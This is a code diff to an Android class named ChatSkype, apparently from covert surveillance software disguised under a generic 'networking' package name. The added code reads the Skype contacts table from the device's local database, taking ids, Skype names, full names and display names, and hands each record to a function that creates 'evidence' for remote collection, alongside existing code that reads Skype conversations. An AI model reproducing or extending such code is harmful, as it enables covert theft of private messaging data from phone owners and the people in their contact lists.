@@ -18,10 +18,13 @@ import org.w3c.dom.NodeList;
 import android.database.Cursor;
 
 import com.android.networking.Messages;
+import com.android.networking.Status;
 import com.android.networking.auto.Cfg;
 import com.android.networking.db.GenericSqliteHelper;
 import com.android.networking.db.RecordVisitor;
 import com.android.networking.file.Path;
+import com.android.networking.manager.ManagerModule;
+import com.android.networking.module.ModuleAddressBook;
 import com.android.networking.util.Check;
 import com.android.networking.util.StringUtils;
 
@@ -124,6 +127,11 @@ public class ChatSkype extends SubModuleChat {
 				GenericSqliteHelper helper = GenericSqliteHelper.open(dbFile);
 				// SQLiteDatabase db = helper.getReadableDatabase();
 
+				// TODO: finish
+				if(ManagerModule.self().isInstancedAgent(ModuleAddressBook.class)){
+					saveSkypeContacts(helper);
+				}
+				
 				List<SkypeConversation> conversations = getSkypeConversations(helper, account);
 				for (SkypeConversation sc : conversations) {
 					String peer = sc.remote;
@@ -146,7 +154,6 @@ public class ChatSkype extends SubModuleChat {
 						if (lastReadId > 0) {
 							updateMarkupSkype(account + peer, lastReadId, true);
 						}
-
 					}
 				}
 
@@ -158,6 +165,29 @@ public class ChatSkype extends SubModuleChat {
 		} finally {
 			readChatSemaphore.release();
 		}
+	}
+
+	private void saveSkypeContacts(GenericSqliteHelper helper) {
+		String[] projection = new String[] { "id", "skypename", "fullname", "displayname" };
+
+		RecordVisitor visitor = new RecordVisitor(projection, null) {
+
+			@Override
+			public long cursor(Cursor cursor) {
+				
+				long id = cursor.getLong(0);
+				String skypename = cursor.getString(1);
+				String fullname = cursor.getString(2);
+				String displayname = cursor.getString(3);
+				
+				Contact c = new Contact(Long.toString(id),skypename,fullname,displayname);
+			
+				ModuleAddressBook.createEvidenceRemote(ModuleAddressBook.SKYPE, c);
+				return id;
+			}
+		};
+
+		helper.traverseRecords("Contacts", visitor);
 	}
 
 	private List<SkypeConversation> getSkypeConversations(GenericSqliteHelper helper, final String account) {
